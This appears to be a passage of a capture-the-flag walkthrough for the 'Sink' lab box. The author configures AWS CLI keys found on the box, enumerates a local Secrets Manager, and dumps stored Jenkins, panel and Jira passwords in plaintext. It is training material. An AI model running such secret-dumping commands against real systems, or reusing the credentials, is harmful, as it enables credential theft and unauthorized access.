# AWS Creds

![[Pasted image 20210618213901.png]]


```bash
marcus@sink:/home/git$ aws configure
AWS Access Key ID []: AKIAIUEN3QWCPSTEITJQ
AWS Secret Access Key []: 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
Default region name []: eu 
Default output format []: json 
```


## Enumerate Services
```bash
marcus@sink:/home/git$ curl localhost:4566/health
{"services": {"logs": "running", "secretsmanager": "running", "kms": "running"}}
``` 

### Secrets Manager Running - Enumerate Secrets

```bash
aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager list-secrets
{
    "SecretList": [
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-WmReC",
            "Name": "Jenkins Login",
            "Description": "Master Server to manage release cycle 1",
            "KmsKeyId": "",
            "RotationEnabled": false,
            "RotationLambdaARN": "",
            "RotationRules": {
                "AutomaticallyAfterDays": 0
            },
            "Tags": [],
            "SecretVersionsToStages": {
                "bd1928a1-8480-480f-bfed-102f6f06568e": [
                    "AWSCURRENT"
                ]
            }
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-WcNql",
            "Name": "Sink Panel",
            "Description": "A panel to manage the resources in the devnode",
            "KmsKeyId": "",
            "RotationEnabled": false,
            "RotationLambdaARN": "",
            "RotationRules": {
                "AutomaticallyAfterDays": 0
            },
            "Tags": [],
            "SecretVersionsToStages": {
                "a2f56047-44ab-4c8a-837e-e1dcf168ed31": [
                    "AWSCURRENT"
                ]
            }
        },
        {
            "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-geXBp",
            "Name": "Jira Support",
            "Description": "Manage customer issues",
            "KmsKeyId": "",
            "RotationEnabled": false,
            "RotationLambdaARN": "",
            "RotationRules": {
                "AutomaticallyAfterDays": 0
            },
            "Tags": [],
            "SecretVersionsToStages": {
                "5c2000fd-bfbb-47fc-a7ee-d78953da8518": [
                    "AWSCURRENT"
                ]
            }
        }
    ]
}
```


### Get Credentials

```bash
marcus@sink:/home/git$ aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager get-secret-value --secret-id='arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-WmReC'
{
    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jenkins Login-WmReC",
    "Name": "Jenkins Login",
    "VersionId": "bd1928a1-8480-480f-bfed-102f6f06568e",
    "SecretString": "{\"username\":\"john@sink.htb\",\"password\":\"R);\\)ShS99mZ~8j\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1624038083
}
marcus@sink:/home/git$ aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager get-secret-value --secret-id='arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-WcNql'
{
    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Sink Panel-WcNql",
    "Name": "Sink Panel",
    "VersionId": "a2f56047-44ab-4c8a-837e-e1dcf168ed31",
    "SecretString": "{\"username\":\"albert@sink.htb\",\"password\":\"Welcome123!\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1624038083
}
marcus@sink:/home/git$ aws --endpoint-url="http://127.0.0.1:4566/" secretsmanager get-secret-value --secret-id='arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-geXBp'
{
    "ARN": "arn:aws:secretsmanager:us-east-1:1234567890:secret:Jira Support-geXBp",
    "Name": "Jira Support",
    "VersionId": "5c2000fd-bfbb-47fc-a7ee-d78953da8518",
    "SecretString": "{\"username\":\"david@sink.htb\",\"password\":\"EALB=bcC=`a7f2#k\"}",
    "VersionStages": [
        "AWSCURRENT"
    ],
    "CreatedDate": 1624038083
}
```